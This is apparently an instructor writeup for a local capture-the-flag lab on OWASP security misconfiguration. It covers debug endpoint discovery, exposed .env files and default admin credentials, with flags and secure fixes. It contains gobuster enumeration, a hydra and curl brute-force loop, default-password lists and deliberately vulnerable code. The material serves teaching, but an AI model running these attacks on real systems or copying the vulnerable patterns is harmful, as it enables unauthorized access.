# A02: Security Misconfiguration - Instructor Writeup

**Lab URL:** http://localhost:3002  
**Topic:** OWASP Top 10 2025 - A02: Security Misconfiguration  
**Difficulty:** Easy → Medium → Hard  
**Theme:** CloudDeploy Platform (SaaS/Cloud Infrastructure)

---

## Overview

This lab teaches students about Security Misconfiguration through progressive challenges in a realistic cloud deployment platform. Students learn to identify debug endpoints, exposed configuration files, and default admin credentials.

### Real-World Impact
- **Cloud Infrastructure Compromise:** Exposed AWS keys grant full account access
- **Data Breach:** Database credentials expose customer PII
- **Financial Loss:** Exposed Stripe API keys enable payment fraud
- **Compliance Violations:** Exposed secrets violate PCI-DSS, SOC 2

### Learning Objectives
- Identify information disclosure through debug endpoints
- Discover configuration leaks containing AWS credentials and API keys
- Exploit default credentials in production cloud systems
- Understand proper secrets management and configuration security

---

## EXAMPLE: Getting Started Guide

**URL:** http://localhost:3002/example  
**Purpose:** Educational walkthrough teaching discovery of debug endpoints via DevTools

### Discovery Method
The Example page auto-loads **4 debug API endpoints** that can be discovered by:
1. Opening **Browser DevTools** (F12 or Cmd+Option+I)
2. Navigating to the **Network tab**
3. Refreshing the page to see all API calls

### Debug Endpoints Discovered

**Part 1: Health Check**
```bash
curl http://localhost:3002/api/example/health
```
Response:
```json
{
  "status": "healthy",
  "message": "Health check endpoint - Part 1 of 4",
  "timestamp": "2024-01-15T10:30:00.000Z",
  "hint": "Check the Network tab to see all API calls"
}
```

**Part 2: Status Endpoint**
```bash
curl http://localhost:3002/api/example/status
```
Response:
```json
{
  "status": "running",
  "message": "Status endpoint - Part 2 of 4",
  "flag": "NSA{D3BUG_D1SC0V3RY}",
  "services": {
    "api": "online",
    "database": "online",
    "cache": "online"
  }
}
```
**Flag:** `NSA{D3BUG_D1SC0V3RY}`

**Part 3: Debug Info**
```bash
curl http://localhost:3002/api/example/debug/info
```
Response:
```json
{
  "flag": "NSA{D3BUG_D1SC0V3RY}",
  "message": "Debug info endpoint - Part 3 of 4",
  "vulnerability": "Debug endpoints expose system information",
  "system": {
    "node_version": "v18.17.0",
    "platform": "darwin",
    "memory_mb": 45
  }
}
```

**Part 4: Config Check**
```bash
curl http://localhost:3002/api/example/debug/config
```
Response:
```json
{
  "flag": "NSA{D3BUG_D1SC0V3RY}",
  "message": "Config check endpoint - Part 4 of 4 - Complete!",
  "vulnerability": "Configuration details exposed via debug endpoint",
  "config": {
    "debug_mode": true,
    "verbose_errors": true,
    "log_level": "debug"
  },
  "warning": "These endpoints should never be accessible in production!"
}
```

### Teaching Points
- **DevTools Discovery:** Network tab reveals all API calls made by the page
- **Debug Endpoints:** Health checks and status endpoints often left enabled in production
- **Information Disclosure:** System details and configuration settings exposed
- **Security Misconfiguration:** Debug mode and verbose errors should be disabled in production

---

## LAB 1: Deployment Dashboard - Stack Trace Exposure

**URL:** http://localhost:3002/lab1  
**Difficulty:** Easy  
**Stage:** Reconnaissance  

### Vulnerability
Stack traces in error responses expose internal file paths, database structure, and sensitive configuration details.

### Discovery Method
1. Visit the deployment dashboard at http://localhost:3002/lab1
2. Notice the hint about using `gobuster` to find deployment APIs
3. Use gobuster or test common patterns like `/api/deployments/:id`

### Required Tools
- `curl` - HTTP requests
- `gobuster` (optional) - API endpoint enumeration

### Exploitation Steps

**Method 1: Direct API Testing**

```bash
# Test deployment API with invalid ID to trigger error
curl http://localhost:3002/api/deployments/999
```

**Method 2: Using gobuster**

```bash
# Enumerate API endpoints
gobuster dir -u http://localhost:3002 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50

# Found: /api/deployments
# Test the endpoint
curl http://localhost:3002/api/deployments/1
```

**Triggering the Stack Trace:**

```bash
# Any invalid deployment ID triggers detailed error
curl http://localhost:3002/api/deployments/999
curl http://localhost:3002/api/deployments/abc
curl http://localhost:3002/api/deployments/-1
```

### Response with Stack Trace

```
Error: Deployment not found

Stack Trace:
Error: Deployment not found
    at /app/server.js:823:15
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:137:13)

Environment Variables:
NODE_ENV=production
DEBUG_MODE=true
DB_HOST=cloudeploy-db.internal
AWS_REGION=us-east-1

Configuration Leak:
Database: mongodb://admin:d3pl0y_db_2024@cloudeploy-db.internal:27017
AWS Account: 947582910374
Deployment Path: /var/www/cloudeploy

NSA{ST4CK_TR4C3_L34K}
```

### Flag
**`NSA{ST4CK_TR4C3_L34K}`**

### Impact
- **Path Disclosure:** Reveals internal file structure and deployment paths
- **Environment Exposure:** Database host, AWS region, debug mode status
- **Credential Hints:** Database connection strings with authentication details
- **Infrastructure Mapping:** AWS account ID and internal hostnames

### Vulnerable Code Pattern
```javascript
app.get('/api/deployments/:id', (req, res) => {
    try {
        const deployment = findDeployment(req.params.id);
        if (!deployment) {
            throw new Error('Deployment not found');
        }
        res.json(deployment);
    } catch (err) {
        // VULNERABILITY: Exposing full error details in production
        res.status(500).send(`
            Error: ${err.message}
            Stack Trace: ${err.stack}
            Environment: ${JSON.stringify(process.env)}
        `);
    }
});
```

### Secure Implementation
```javascript
app.get('/api/deployments/:id', (req, res) => {
    try {
        const deployment = findDeployment(req.params.id);
        if (!deployment) {
            return res.status(404).json({ 
                error: 'Deployment not found' 
            });
        }
        res.json(deployment);
    } catch (err) {
        // Log internally but return generic error
        logger.error('Deployment error:', err);
        res.status(500).json({ 
            error: 'Internal server error' 
        });
    }
});
```

---

## LAB 2: Configuration Files - Environment Variable Exposure

**URL:** http://localhost:3002/lab2  
**Difficulty:** Medium  
**Stage:** Scanning  

### Vulnerability
Exposed `.env` and `.env.backup` files containing AWS credentials, database passwords, and payment API keys.

### Discovery Method
1. Visit http://localhost:3002/lab2
2. Notice the hint about checking for configuration files
3. Test common file paths like `/.env`, `/.env.backup`, `/config/`

### Required Tools
- `curl` - HTTP file retrieval
- `gobuster` (optional) - File enumeration

### Exploitation Steps

**Method 1: Direct File Access**

```bash
# Test for .env file
curl http://localhost:3002/.env

# Test for backup files
curl http://localhost:3002/.env.backup
curl http://localhost:3002/.env.old
curl http://localhost:3002/.env.production
```

**Method 2: Using gobuster**

```bash
# Search for configuration files
gobuster dir -u http://localhost:3002 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x .env,.bak,.backup,.old \
  -t 50

# Found files:
# /.env (Status: 200)
# /.env.backup (Status: 200)
```

**Retrieve Configuration Files:**

```bash
# Primary .env file
curl -s http://localhost:3002/.env

# Backup .env file (may have older/different secrets)
curl -s http://localhost:3002/.env.backup
```

### Exposed .env File Contents

```bash
# CloudDeploy Platform - Production Configuration
# DO NOT COMMIT THIS FILE TO GIT!

# AWS Credentials
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_REGION=us-east-1
AWS_BUCKET=clouddeploy-prod-assets

# Database Configuration
DB_HOST=clouddeploy-db.internal
DB_PORT=27017
DB_NAME=clouddeploy_production
DB_USER=deploy_admin
DB_PASSWORD=D3pl0y_Pr0d_P4ssw0rd_2024!

# Stripe Payment API
STRIPE_SECRET_KEY=sk_live_51MsXYZ...CloudDeployProdKey2024
STRIPE_PUBLISHABLE_KEY=pk_live_51MsXYZ...CloudDeployPublic
STRIPE_WEBHOOK_SECRET=whsec_CloudDeploy2024ProductionHook

# JWT & Sessions
JWT_SECRET=clouddeploy_jwt_secret_key_production_2024
SESSION_SECRET=cloud-deployment-session-secret-2024

# External APIs
SENDGRID_API_KEY=SG.CloudDeploy_Prod_Key_xyz789
DATADOG_API_KEY=dd_api_key_CloudDeploy_monitoring_2024

# Flag for capture
NSA{C0NF1G_L3AK3D}
```

### Flag
**`NSA{C0NF1G_L3AK3D}`**

### Impact
- **AWS Account Compromise:** Full access to S3 buckets and EC2 instances
- **Database Breach:** Direct access to production database with all customer data
- **Payment Fraud:** Stripe keys allow unauthorized charges and refunds
- **Account Takeover:** JWT secrets enable token forgery for any user
- **Email Spoofing:** SendGrid key allows sending emails as the platform

### Real-World Examples
- **Uber 2016:** AWS keys in GitHub led to 57M user records stolen
- **Toyota 2023:** Exposed AWS credentials leaked 2.15 million customer records
- **Codecov 2021:** Exposed secrets in CI/CD led to widespread supply chain attack

### Vulnerable Configuration
```bash
# Common misconfigurations:
# 1. .env files served by web server
# 2. Backup files (.env.backup, .env.old) not excluded
# 3. Git commits containing .env files
# 4. Cloud storage buckets with public read access
```

### Secure Implementation

**1. Prevent Web Access (.htaccess)**
```apache
<Files ".env*">
    Require all denied
</Files>
```

**2. Nginx Configuration**
```nginx
location ~ /\.env {
    deny all;
    return 404;
}
```

**3. Use Secrets Management**
```bash
# Use AWS Secrets Manager, HashiCorp Vault, or similar
# Never store production secrets in .env files
aws secretsmanager get-secret-value --secret-id prod/database
```

**4. Proper .gitignore**
```
.env
.env.*
!.env.example
```

---

## LAB 3: Admin Login - Default Credentials

**URL:** http://localhost:3002/lab3  
**Difficulty:** Hard  
**Stage:** Initial Access  

### Vulnerability
Default administrator credentials left unchanged in production system.

### Discovery Method
1. Visit http://localhost:3002/lab3
2. Find the admin login form
3. Test common default credentials for cloud platforms

### Required Tools
- `curl` - HTTP POST requests
- `hydra` (optional) - Credential brute forcing

### Exploitation Steps

**Method 1: Common Default Credentials**

```bash
# CloudDeploy default credentials (from documentation/setup guides)
curl -X POST http://localhost:3002/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "CloudDeploy123!"
  }'
```

**Method 2: Default Credential List**

```bash
# Test common cloud platform defaults
declare -a passwords=(
  "CloudDeploy123!"
  "Admin123!"
  "admin"
  "password"
  "changeme"
  "CloudDeploy2024"
)

for pass in "${passwords[@]}"; do
  echo "Testing: admin/$pass"
  curl -s -X POST http://localhost:3002/api/admin/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}" \
    | grep -o 'NSA{[^}]*}'
done
```

**Method 3: Using Hydra**

```bash
# Create password list
cat > passwords.txt << EOF
CloudDeploy123!
Admin123!
admin
password
changeme
CloudDeploy2024
EOF

# Brute force login
hydra -l admin -P passwords.txt \
  localhost -s 3002 \
  http-post-form "/api/admin/login:username=^USER^&password=^PASS^:F=Invalid" \
  -V
```

### Successful Login Response

```json
{
  "success": true,
  "message": "Admin login successful",
  "flag": "NSA{D3F4ULT_CR3D5_PWN3D}",
  "admin": {
    "username": "admin",
    "role": "super_admin",
    "permissions": ["full_access", "deploy", "configure", "delete"],
    "access_level": "root"
  },
  "warning": "These are the DEFAULT CREDENTIALS! Change immediately in production!"
}
```

### Flag
**`NSA{D3F4ULT_CR3D5_PWN3D}`**

### Credentials
- **Username:** `admin`
- **Password:** `CloudDeploy123!`

### Impact
- **Full Platform Control:** Complete administrative access to cloud infrastructure
- **Customer Data Access:** View and export all customer deployments and data
- **Configuration Changes:** Modify system settings, add backdoors
- **Deployment Manipulation:** Deploy malicious code to customer environments
- **Account Creation:** Create additional admin accounts for persistence

### Real-World Examples
- **Mirai Botnet 2016:** Default credentials on IoT devices infected 600,000+ devices
- **Capital One 2019:** Default AWS credentials in misconfigured WAF
- **Colonial Pipeline 2021:** VPN with no MFA using default/weak credentials

### Common Default Credentials
```
Cloud Platforms:
- admin/admin
- admin/Admin123!
- administrator/password
- root/root
- admin/changeme

SaaS Products:
- admin/ProductName123!
- admin/Welcome123
- superadmin/admin
```

### Vulnerable Code Pattern
```javascript
const adminCredentials = {
    username: 'admin',
    password: 'CloudDeploy123!'  // DEFAULT - Never changed!
};

app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    // Direct comparison with hardcoded defaults
    if (username === adminCredentials.username && 
        password === adminCredentials.password) {
        return res.json({
            success: true,
            flag: 'NSA{D3F4ULT_CR3D5_PWN3D}'
        });
    }
    
    res.status(401).json({ error: 'Invalid credentials' });
});
```

### Secure Implementation

**1. Force Password Change on First Login**
```javascript
app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    
    const user = await User.findOne({ username });
    
    if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    if (user.mustChangePassword) {
        return res.json({ 
            requirePasswordChange: true,
            message: 'Please change your password'
        });
    }
    
    // Normal login flow
});
```

**2. Password Complexity Requirements**
```javascript
function validatePassword(password) {
    const minLength = 12;
    const hasUppercase = /[A-Z]/.test(password);
    const hasLowercase = /[a-z]/.test(password);
    const hasNumber = /[0-9]/.test(password);
    const hasSpecial = /[!@#$%^&*]/.test(password);
    
    return password.length >= minLength &&
           hasUppercase && hasLowercase &&
           hasNumber && hasSpecial;
}
```

**3. Multi-Factor Authentication**
```javascript
app.post('/api/admin/login', async (req, res) => {
    const { username, password, totpCode } = req.body;
    
    // Verify password
    const user = await User.findOne({ username });
    if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Require TOTP for admin accounts
    if (user.role === 'admin') {
        const verified = speakeasy.totp.verify({
            secret: user.totpSecret,
            encoding: 'base32',
            token: totpCode
        });
        
        if (!verified) {
            return res.status(401).json({ error: 'Invalid 2FA code' });
        }
    }
    
    // Generate session token
    const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET);
    res.json({ success: true, token });
});
```

**4. Account Lockout**
```javascript
const loginAttempts = new Map();

app.post('/api/admin/login', async (req, res) => {
    const { username } = req.body;
    
    // Check lockout status
    const attempts = loginAttempts.get(username) || { count: 0, lockedUntil: null };
    
    if (attempts.lockedUntil && Date.now() < attempts.lockedUntil) {
        const minutesLeft = Math.ceil((attempts.lockedUntil - Date.now()) / 60000);
        return res.status(429).json({ 
            error: `Account locked. Try again in ${minutesLeft} minutes` 
        });
    }
    
    // Verify credentials...
    
    // On failed login:
    attempts.count++;
    if (attempts.count >= 5) {
        attempts.lockedUntil = Date.now() + (15 * 60 * 1000); // 15 minutes
    }
    loginAttempts.set(username, attempts);
});
```

---

## Summary

### Flags
1. **Example:** `NSA{D3BUG_D1SC0V3RY}` - Debug endpoints discovered via DevTools
2. **Lab 1:** `NSA{ST4CK_TR4C3_L34K}` - Stack traces expose internal details
3. **Lab 2:** `NSA{C0NF1G_L3AK3D}` - .env files with AWS/DB/Stripe credentials
4. **Lab 3:** `NSA{D3F4ULT_CR3D5_PWN3D}` - Default admin credentials (admin/CloudDeploy123!)

### Key Takeaways
1. **Disable Debug Mode:** Never run production with debug endpoints enabled
2. **Protect Configuration:** Never serve .env files via web server
3. **Use Secrets Management:** AWS Secrets Manager, HashiCorp Vault, Azure Key Vault
4. **Change Defaults:** Force password changes on first login
5. **Enable MFA:** Require multi-factor authentication for admin accounts
6. **Monitor Access:** Log and alert on admin login attempts
7. **Generic Errors:** Never expose stack traces or environment details in errors
8. **Regular Audits:** Scan for exposed configuration files and debug endpoints

### OWASP Top 10 2025 - A02 Mitigation
- **Secure Installation:** Remove default accounts and sample applications
- **Minimal Platform:** Disable unnecessary features and frameworks
- **Security Headers:** Implement proper CSP, HSTS, X-Frame-Options
- **Error Handling:** Generic error messages without sensitive details
- **Patch Management:** Keep all dependencies and frameworks updated
- **Secrets Management:** Use dedicated vault solutions, not environment files
- **Access Control:** Strong authentication with MFA for administrative functions
